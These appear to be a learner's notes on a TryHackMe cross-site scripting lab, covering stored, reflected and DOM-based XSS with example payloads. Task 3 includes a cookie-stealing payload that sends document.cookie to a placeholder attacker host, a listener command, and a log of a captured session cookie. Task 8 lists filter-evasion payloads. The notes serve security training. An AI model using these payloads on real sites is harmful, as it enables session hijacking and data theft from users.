# Room
https://tryhackme.com/room/xss

# Task 1 - Intro
XSS = Cross-site Scripting.  A vulnerability usually found in web applications that allows an attacker to execute malicious scripts.  Unsanitized user input is the common attack vector.  XSS is possible in Javascript, VBScript, Flash, and CSS.
* Two main categories
    * Persistent/Stored
    * Reflected
* Cooking Stealing - a cookie that is stolen from an authenticated session
* Keylogging - a record of your keystrokes sent to an attacker
* Webcam Snapshot - taking pictures from a compromised webcam
* Phishing - insertion of fake logins or redirection to clone sites that steal your info
* Port Scanning - using stored XSS to port scan an internal network

# Task 2 - Deploy
Deploy test machine

# Task 3 - Stored XSS
The most dangerous type of XSS.
1. Attacker inserts malicious payload into website database
2. For every visit to the website the malicious script is activated
3. The data is gathered and sent to the attacker which could be the victim's cookie or other data

* Example payload
    ```
    <script>alert(1)</script>
    ```
* Display cookie
    ```
    <script>alert(document.cookie)</script>
    ```
* Change span text
    ```
    </script>document.getElementById("span").textContent="text";</script>
    ```
* Grab cookies
    ```
    <script>window.location='http://a.b.c.d/?cookie='+document.cookie</script>

    sudo python3 -m http.server 80

    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    a.b.c.d - - [03/Feb/2021 19:02:30] "GET /?cookie=connect.sid=s%3AsDYS6z6eLmN-HwTWN6WixeJnn-zpCUPL.%2Fjg%2BcVRIrTYJZM9aR7sO075eA0aFlqk8OdIzdK4aL3s HTTP/1.1" 200 -
    ```

# Task 4 - Reflected XSS
Reflected XSS has the payload being a part of the victim's request to the website.
1. Attacker sends malicious link to victim
2. Victim clicks link and is taken to vulnerable website
3. Link containing attacker's script executes
4. Data that attacker's script gathers is sent to attacker which could be the victim's cookie or other data
* Example payload
    ```
    http://example.com/search?keyword=<script>...</script>
    ```
* Reflect Hello
    ```
    <script>alert("Hello")</script>
    ```
* Reflect IP address
    ```
    <script>alert(window.location.hostname)</script>
    ```

# Task 5 - DOM-Based XSS
DOM stands for Document Object Model and is the programming interface for HTML and XML.
* DOM reference
    * https://www.w3schools.com/js/js_htmldom.asp
* DOM based XSS is only executed when the vulnerable JavaScript code is loaded or interacted with
* XSS reference
    * https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

# Task 6 - XSS for IP and Port Scanning
Port scanning is available via XSS.
* Reference
    * https://github.com/aabeling/portscan

# Task 7 - XSS Keylogger
Listening for key strokes is also possible.

# Task 8 - Filter Evasion
Filters are put into place as an attempt to block malicious payloads.
* Bypass script tags
    ```
    <iframe src=# onmouseover="alert('Hello')"></iframe>
    ```
* Bypass alert string
    ```
    <iframe src=# onmouseover="prompt('Hello')"></iframe>
    ```
* Bypass hello
    ```
    <img src=# onmouseover="alert('HelloHello')"></img>
    ```
* Bypass most on events
    ```
    <img src=# onclick="alert('HelloHello')"></img>
    ```
* References
    * https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
    * https://owasp.org/www-community/xss-filter-evasion-cheatsheet
    * https://developer.mozilla.org/en-US/docs/Web/API/GlobalEventHandlers/onerror
